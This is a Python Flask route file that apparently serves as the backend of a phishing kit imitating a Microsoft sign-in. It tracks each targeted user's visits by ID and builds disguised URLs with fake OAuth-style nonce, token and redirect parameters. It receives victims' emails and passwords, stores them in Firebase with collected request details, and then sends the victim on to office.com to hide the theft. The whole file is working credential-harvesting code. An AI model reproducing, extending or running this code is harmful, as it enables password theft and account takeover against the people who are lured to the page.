from flask import Blueprint, render_template, redirect, request, Response, url_for
from app.services.firebase import get_user_by_id, add_email, get_email_by_email, save_user_data, update_visited, update_user_email, update_user_password
from app.utils import collect_user_info
from urllib.parse import parse_qs, urlencode
from uuid import uuid4 as uuid
from flask import request
from app import csrf
import os, secrets, json

MASKED_URI_PATH = os.environ.get("MASKED_URI_PATH", None)
MASKED_URI_PARAMS = os.environ.get("MASKED_URI_PARAMS", None)
REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://www.office.com/?auth=1")

main_bp = Blueprint('main_bp', __name__)

def handle_user(user_id=None):
    if user_id and get_user_by_id(user_id):
        update_visited(user_id)
        
    return render_template("index.html", user_id=user_id)

def generate_masked_uri_params(user_id):
    args = request.args.to_dict()
    redirect_uri = REDIRECT_URI
    nonce = str(int.from_bytes(secrets.token_bytes(8), "big"))
    token = secrets.token_urlsafe(64)
    uuid_val = str(uuid())
    
    # Reemplazar los placeholders en MASKED_URI_PARAMS con los valores generados
    masked_uri_params_filled = MASKED_URI_PARAMS.replace("{{user_id}}", (user_id or str(uuid()))) \
        .replace("{{redirect_uri}}", redirect_uri) \
        .replace("{{number}}", nonce) \
        .replace("{{token}}", token) \
        .replace("{{uuid}}", uuid_val)

    # Convertir el string de parámetros en un diccionario
    uri_params = {k: v[0] if len(v) == 1 else v for k, v in parse_qs(masked_uri_params_filled).items()}
    args.update(uri_params)

    return args

@main_bp.get("/")
def index():
    if MASKED_URI_PATH:
        args = generate_masked_uri_params(None)
        return redirect(url_for("main_bp.masked_uri_path", **args))
    else:
        return handle_user()

@main_bp.get('/<user_id>')
def user_route(user_id):
    if MASKED_URI_PATH:
        args = generate_masked_uri_params(user_id)
        return redirect(url_for("main_bp.masked_uri_path", **args))
    
    return handle_user(user_id)

if MASKED_URI_PATH:
    @main_bp.get(f"{MASKED_URI_PATH}")
    def masked_uri_path():
        return handle_user(request.args.get("user_id", None))

@main_bp.post("/")
def main():
    if request.headers.get("Content-Type") == "application/json":
        data: dict | None = request.get_json()

        anonymous = str(uuid())
        user_id = data.get("user_id", anonymous)
        anonymous = user_id
        anonymous_email = f"anonymous@{''.join(anonymous.split('-'))}.com"

        userdata = get_user_by_id(user_id)

        if not userdata:
            add_email(anonymous_email, user_id)
            save_user_data(user_id, collect_user_info(request))
            
        if data.get("email"):
            update_user_email(user_id, data.get("email"))
            save_user_data(user_id, collect_user_info(request))
        elif data.get("password"):
            update_user_password(user_id, data.get("password"))
        else:
            return Response(json.dumps({"error": "Bad Request"}), status=400)
    
    return Response(json.dumps({"message": "User data updated", "redirect": REDIRECT_URI }), status=200)
